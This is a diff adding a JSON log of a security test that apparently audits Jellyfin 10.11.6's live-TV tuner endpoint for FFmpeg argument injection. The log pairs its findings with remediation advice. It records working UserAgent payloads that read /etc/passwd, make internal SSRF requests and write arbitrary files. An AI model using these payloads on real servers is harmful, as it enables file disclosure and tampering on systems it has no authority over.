@@ -1,0 +1,98 @@
+{
+  "script": "phase2d_tuner_injection",
+  "phase": "phase2",
+  "target": "Jellyfin 10.11.6",
+  "start_time": "2026-03-02T18:49:45.732174",
+  "end_time": "2026-03-02T18:49:48.405510",
+  "summary": {
+    "total_tests": 5,
+    "findings": 4,
+    "anomalies": 0
+  },
+  "tests": [
+    {
+      "id": "TUNER-NORMAL",
+      "description": "Tuner host normal UA",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla/5.0 Normal",
+      "response": "HTTP 200: tuner created",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:49:45.772194"
+    },
+    {
+      "id": "TUNER-INJECT-quote_break",
+      "description": "Tuner UA injection: Quote break + null output + extra input",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -f null /dev/null -i \"",
+      "response": "HTTP 200: stored UA=Mozilla\" -f null /dev/null -i \"",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:49:46.284450"
+    },
+    {
+      "id": "TUNER-INJECT-file_read_passwd",
+      "description": "Tuner UA injection: Read /etc/passwd via -i flag",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proo",
+      "response": "HTTP 200: stored UA=Mozilla\" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proof.raw -y -i \"",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:49:46.844730"
+    },
+    {
+      "id": "TUNER-INJECT-ssrf",
+      "description": "Tuner UA injection: SSRF to Docker host",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info -f null /dev/",
+      "response": "HTTP 200: stored UA=Mozilla\" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info -f null /dev/null -y -i \"",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:49:47.372994"
+    },
+    {
+      "id": "TUNER-INJECT-file_write",
+      "description": "Tuner UA injection: Write arbitrary file",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -y -f mp4 /tmp/pwned.mp4 -i \"",
+      "response": "HTTP 200: stored UA=Mozilla\" -y -f mp4 /tmp/pwned.mp4 -i \"",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:49:47.877246"
+    }
+  ],
+  "findings": [
+    {
+      "id": "FFMPEG-UA-STORED-Inject-quote_br",
+      "severity": "HIGH",
+      "title": "FFmpeg argument injection stored in tuner config: Inject-quote_break",
+      "details": "TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla\" -f null /dev/null -i \". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.",
+      "evidence": "{\n  \"Id\": \"140af78093084875816e610d5e7712c0\",\n  \"Url\": \"http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u\",\n  \"Type\": \"M3U\",\n  \"FriendlyName\": \"Inject-quote_break\",\n  \"ImportFavoritesOnly\": false,\n  \"AllowHWTranscoding\": true,\n  \"AllowFmp4TranscodingContainer\": false,\n  \"AllowStreamSharing\": true,\n  \"FallbackMaxStreamingBitrate\": 30000000,\n  \"EnableStreamLooping\": false,\n  \"TunerCount\": 0,\n  \"UserAgent\": \"Mozilla\\\" -f null /dev/null -i \\\"\",\n  \"IgnoreDts\": true,\n  \"ReadAtNativeFramerate\": false\n}",
+      "remediation": "Sanitize UserAgent in TunerHostInfo.UserAgent setter or in M3UTunerHost before assigning to RequiredHttpHeaders. Strip double quotes and validate against FFmpeg arg patterns.",
+      "timestamp": "2026-03-02T18:49:48.373494"
+    },
+    {
+      "id": "FFMPEG-UA-STORED-Inject-file_rea",
+      "severity": "HIGH",
+      "title": "FFmpeg argument injection stored in tuner config: Inject-file_read_passwd",
+      "details": "TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla\" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proof.raw -y -i \". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.",
+      "evidence": "{\n  \"Id\": \"951821bcfd704dc2a83d868480176584\",\n  \"Url\": \"http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u\",\n  \"Type\": \"M3U\",\n  \"FriendlyName\": \"Inject-file_read_passwd\",\n  \"ImportFavoritesOnly\": false,\n  \"AllowHWTranscoding\": true,\n  \"AllowFmp4TranscodingContainer\": false,\n  \"AllowStreamSharing\": true,\n  \"FallbackMaxStreamingBitrate\": 30000000,\n  \"EnableStreamLooping\": false,\n  \"TunerCount\": 0,\n  \"UserAgent\": \"Mozilla\\\" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proof.raw -y -i \\\"\",\n  \"IgnoreDts\": true,\n  \"ReadAtNativeFramerate\": false\n}",
+      "remediation": "Sanitize UserAgent in TunerHostInfo.UserAgent setter or in M3UTunerHost before assigning to RequiredHttpHeaders. Strip double quotes and validate against FFmpeg arg patterns.",
+      "timestamp": "2026-03-02T18:49:48.373494"
+    },
+    {
+      "id": "FFMPEG-UA-STORED-Inject-ssrf",
+      "severity": "HIGH",
+      "title": "FFmpeg argument injection stored in tuner config: Inject-ssrf",
+      "details": "TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla\" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info -f null /dev/null -y -i \". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.",
+      "evidence": "{\n  \"Id\": \"7e14ace63db340eeab99d3287263dd70\",\n  \"Url\": \"http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u\",\n  \"Type\": \"M3U\",\n  \"FriendlyName\": \"Inject-ssrf\",\n  \"ImportFavoritesOnly\": false,\n  \"AllowHWTranscoding\": true,\n  \"AllowFmp4TranscodingContainer\": false,\n  \"AllowStreamSharing\": true,\n  \"FallbackMaxStreamingBitrate\": 30000000,\n  \"EnableStreamLooping\": false,\n  \"TunerCount\": 0,\n  \"UserAgent\": \"Mozilla\\\" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info -f null /dev/null -y -i \\\"\",\n  \"IgnoreDts\": true,\n  \"ReadAtNativeFramerate\": false\n}",
+      "remediation": "Sanitize UserAgent in TunerHostInfo.UserAgent setter or in M3UTunerHost before assigning to RequiredHttpHeaders. Strip double quotes and validate against FFmpeg arg patterns.",
+      "timestamp": "2026-03-02T18:49:48.373494"
+    },
+    {
+      "id": "FFMPEG-UA-STORED-Inject-file_wri",
+      "severity": "HIGH",
+      "title": "FFmpeg argument injection stored in tuner config: Inject-file_write",
+      "details": "TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla\" -y -f mp4 /tmp/pwned.mp4 -i \". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.",
+      "evidence": "{\n  \"Id\": \"3b1452af568a41d5a0a1babaf4277e34\",\n  \"Url\": \"http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u\",\n  \"Type\": \"M3U\",\n  \"FriendlyName\": \"Inject-file_write\",\n  \"ImportFavoritesOnly\": false,\n  \"AllowHWTranscoding\": true,\n  \"AllowFmp4TranscodingContainer\": false,\n  \"AllowStreamSharing\": true,\n  \"FallbackMaxStreamingBitrate\": 30000000,\n  \"EnableStreamLooping\": false,\n  \"TunerCount\": 0,\n  \"UserAgent\": \"Mozilla\\\" -y -f mp4 /tmp/pwned.mp4 -i \\\"\",\n  \"IgnoreDts\": true,\n  \"ReadAtNativeFramerate\": false\n}",
+      "remediation": "Sanitize UserAgent in TunerHostInfo.UserAgent setter or in M3UTunerHost before assigning to RequiredHttpHeaders. Strip double quotes and validate against FFmpeg arg patterns.",
+      "timestamp": "2026-03-02T18:49:48.373494"
+    }
+  ],
+  "anomalies": []
+}
